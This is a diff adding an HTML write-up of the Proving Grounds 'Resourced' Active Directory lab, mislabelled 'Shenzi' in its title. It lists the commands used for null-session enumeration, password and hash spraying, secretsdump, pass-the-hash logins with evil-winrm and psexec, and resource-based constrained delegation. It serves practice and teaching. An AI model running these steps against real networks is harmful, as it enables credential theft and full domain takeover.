@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Shenzi Writeup - Rachel Murphy" />
+  <title>PG: Shenzi | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Resourced — Writeup</h1>
+      <p class="meta">Proving Grounds — Active Directory Resource-Based Constrained Delegation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> “Resourced VM” is an intermediate Active Directory machine on OffSec’s Proving Grounds platform. It’s designed for penetration testing practice to prepare for OSCP exams. The goal is to gain initial access, identify credentials (SMB, RPC), and exploit Active Directory using Resource-Based Constrained Delegation to escalate privileges to domain controller administrator.</p>
+
+      <h3>Key Features</h3>
+      <ul>
+        <li>Simulates a real-world corporate Active Directory environment.</li>
+        <li>Focuses on SMB/RPC enumeration and credential discovery.</li>
+        <li>Privilege escalation via Resource-Based Constrained Delegation.</li>
+        <li>Perfect for practicing OSCP-level AD exploitation techniques.</li>
+      </ul>
+
+      <h3>Typical Approach</h3>
+      <ul>
+        <li><strong>Reconnaissance:</strong> Scan open ports and services using tools like <code>nmap</code>.</li>
+        <li><strong>Initial Access:</strong> Enumerate SMB or RPC to discover users and files.</li>
+        <li><strong>Credential Discovery:</strong> Extract credentials or hashes from discovered resources.</li>
+        <li><strong>Privilege Escalation:</strong> Leverage discovered credentials to escalate privileges (Resource-Based Constrained Delegation).</li>
+        <li><strong>Root Flag:</strong> Use elevated privileges to obtain the root/administrator flag.</li>
+      </ul>
+    </section>
+
+    <!-- Nmap -->
+    <section>
+      <h2>NMAP</h2>
+      <p>Initial reconnaissance was performed with <code>nmap</code> to enumerate open ports and services on the target. This identifies the exposed attack surface.</p>
+      <div class="code-block">
+        <pre>sudo nmap -sC -sV 192.168.247.175 -oN nmap-resourced</pre>
+      </div>
+      <img src="../images/Pasted image 20250706010648.png" alt="Nmap screenshot 1" class="screenshot">
+      <img src="../images/Pasted image 20250706011022.png" alt="Nmap screenshot 2" class="screenshot">
+    </section>
+
+    <!-- SMB -->
+    <section>
+      <h2>SMB</h2>
+      <p>Checked for SMB shares to see if any unauthenticated access was possible. Anonymous access was denied, which forced further enumeration with credentials.</p>
+      <img src="../images/Pasted image 20250706010951.png" alt="SMB attempt" class="screenshot">
+      <img src="../images/Pasted image 20250706011409.png" alt="SMB denied" class="screenshot">
+    </section>
+
+    <!-- RPC -->
+    <section>
+      <h2>RPC</h2>
+      <p>Queried the host with <code>rpcclient</code> using a null session to extract user information. This output was cleaned and parsed to build a user list for later password or hash spraying.</p>
+      <div class="code-block">
+        <pre>rpcclient -U '' -N 192.168.247.175</pre>
+      </div>
+      <img src="../images/Pasted image 20250706011612.png" alt="rpcclient output" class="screenshot">
+      <p>Clean up usernames from the dump:</p>
+      <div class="code-block">
+        <pre>awk -F: '{ print $2 }' users.txt</pre>
+      </div>
+      <img src="../images/Pasted image 20250706012241.png" alt="awk output" class="screenshot">
+      <p>Tidy with vim substitution:</p>
+      <div class="code-block">
+        <pre>:%s/.*\[\([^\]]*\)\].*/\1/g</pre>
+      </div>
+      <img src="../images/Pasted image 20250706012307.png" alt="vim regex" class="screenshot">
+      <p>Collected a clean user list:</p>
+      <img src="../images/Pasted image 20250706012505.png" alt="user list" class="screenshot">
+    </section>
+
+    <!-- Credentials found in descriptions -->
+    <section>
+      <h2>Credentials found in descriptions</h2>
+      <p>AD object descriptions often leak credentials. Here, a password for <code>V.Ventz</code> was found and tested with <code>nxc smb</code> to identify accessible shares.</p>
+      <img src="../images/Pasted image 20250706012854.png" alt="password in description" class="screenshot">
+      <div class="code-block">
+        <pre>nxc smb 192.168.247.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares</pre>
+      </div>
+      <img src="../images/Pasted image 20250706013215.png" alt="nxc shares output" class="screenshot">
+      <p>Read the discovered share:</p>
+      <div class="code-block">
+        <pre>smbclient -U V.Ventz //192.168.247.175/Password\ Audit/</pre>
+      </div>
+      <img src="../images/Pasted image 20250706013438.png" alt="smbclient access" class="screenshot">
+      <img src="../images/Pasted image 20250706124158.png" alt="files in share 1" class="screenshot">
+      <img src="../images/Pasted image 20250706124139.png" alt="files in share 2" class="screenshot">
+      <p>Found <code>ntds.dit</code> and registry hives — critical data for offline hash extraction.</p>
+    </section>
+
+    <!-- Secrets dump -->
+    <section>
+      <h2>Impacket SecretsDump (local)</h2>
+      <p>Used the extracted <code>ntds.dit</code> and <code>SYSTEM</code> hive with <code>impacket-secretsdump</code> locally to dump password hashes for offline cracking or direct authentication.</p>
+      <div class="code-block">
+        <pre>impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</pre>
+      </div>
+      <img src="../images/Pasted image 20250706013935.png" alt="secretsdump output" class="screenshot">
+      <p>Got an admin hash but initial attempts to use it failed. Cleaned and extracted usernames/hashes for spraying:</p>
+      <div class="code-block">
+        <pre>cat hashes.txt| sed -En 's/^[^:]*:[^:]*:[^:]*:([^:]*):.*$/\1/p'
+sed 's/:.*//' hashes.txt</pre>
+      </div>
+      <img src="../images/Pasted image 20250706114152.png" alt="extract hashes" class="screenshot">
+      <img src="../images/Pasted image 20250706114352.png" alt="extract usernames" class="screenshot">
+    </section>
+
+    <!-- WinRM hash spray success -->
+    <section>
+      <h2>WinRM hash spray success</h2>
+      <p>Sprayed the cleaned hashes against WinRM. This produced a working credential for <code>L.Livingstone</code>, granting an initial shell with Evil-WinRM.</p>
+      <div class="code-block">
+        <pre>nxc winrm 192.168.236.175 -u clean-users.txt -H clean-hashes.txt</pre>
+      </div>
+      <img src="../images/Pasted image 20250706123828.png" alt="winrm spray success" class="screenshot">
+      <div class="code-block">
+        <pre>evil-winrm -i 192.168.236.175 -H 19a3a7550ce8c505c2d46b5e39d6f808 -u L.Livingstone</pre>
+      </div>
+      <img src="../images/Pasted image 20250706124856.png" alt="evil-winrm login" class="screenshot">
+    </section>
+
+    <!-- Interesting directories -->
+    <section>
+      <h2>Interesting directories</h2>
+      <p>Once inside, enumerated directories looking for sensitive data. Noticed a suspicious <em>resources</em> folder matching the box name.</p>
+      <img src="../images/Pasted image 20250706125141.png" alt="interesting folders" class="screenshot">
+      <ul>
+        <li>Windows10Upgrade</li>
+        <li>Password Audit</li>
+        <li>resources (suspicious given box name)</li>
+      </ul>
+    </section>
+
+    <!-- WinPEAS -->
+    <section>
+      <h2>WinPEAS</h2>
+      <p>Ran WinPEAS for privilege escalation hints. It revealed registry keys and ACLs but no direct escalation path, prompting further AD enumeration.</p>
+      <img src="../images/Pasted image 20250706130639.png" alt="winpeas output" class="screenshot">
+    </section>
+
+    <!-- Sharphound / BloodHound -->
+    <section>
+      <h2>Sharphound / BloodHound</h2>
+      <p>Collected AD data with SharpHound and analyzed in BloodHound. Marked <code>L.Livingstone</code> as owned and discovered <strong>GenericAll</strong> rights over the DC — enabling Resource-Based Constrained Delegation attack.</p>
+      <img src="../images/Pasted image 20250706132613.png" alt="outbound object control" class="screenshot">
+      <img src="../images/Pasted image 20250706132715.png" alt="genericall over DC" class="screenshot">
+    </section>
+
+    <!-- Resource-based constrained delegation flow -->
+    <section>
+      <h2>Resource-based Constrained Delegation (RBCD) flow</h2>
+      <p>Created a new machine account and modified the DC’s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute to allow impersonation using the new account.</p>
+      <img src="../images/Pasted image 20250706141243.png" alt="new machine account" class="screenshot">
+    </section>
+
+    <!-- Rubeus / S4U -->
+    <section>
+      <h2>Rubeus — hash to ticket impersonation</h2>
+      <p>Used Rubeus to generate RC4_HMAC hash of the machine account password, request a service ticket for Administrator, and inject it to impersonate Administrator.</p>
+      <img src="../images/Pasted image 20250706142618.png" alt="rubeus s4u 1" class="screenshot">
+    </section>
+
+    <!-- Psexec -->
+    <section>
+      <h2>PSEXEC (DRSUAPI / impacket) — get SYSTEM</h2>
+      <p>Finally, used the obtained Administrator hash with <code>impacket-psexec</code> to gain SYSTEM on the DC.</p>
+      <div class="code-block">
+        <pre>impacket-psexec Administrator@192.168.236.175 -hashes aad3b435b51404eeaad3b435b51404ee:8e0efd059433841f73d171c69afdda7c</pre>
+      </div>
+      <img src="../images/Pasted image 20250706144725.png" alt="got system 1" class="screenshot">
+    </section>
+
+    <section>
+      <h2>Key takeaways</h2>
+      <ul>
+        <li>Check object descriptions & share contents — creds often leak in descriptions.</li>
+        <li>NTDS + SYSTEM from shares are gold but may require cleanup and parsing.</li>
+        <li>Hash spraying + WinRM is a reliable technique in some environments.</li>
+        <li>BloodHound & RBCD flow can convert low-privilege AD control into full domain compromise.</li>
+        <li>Rubeus + impacket ticket conversion is a powerful combo for getting admin hashes/tickets.</li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
+    </div>
+  </footer>
+
+</body>
+</html>
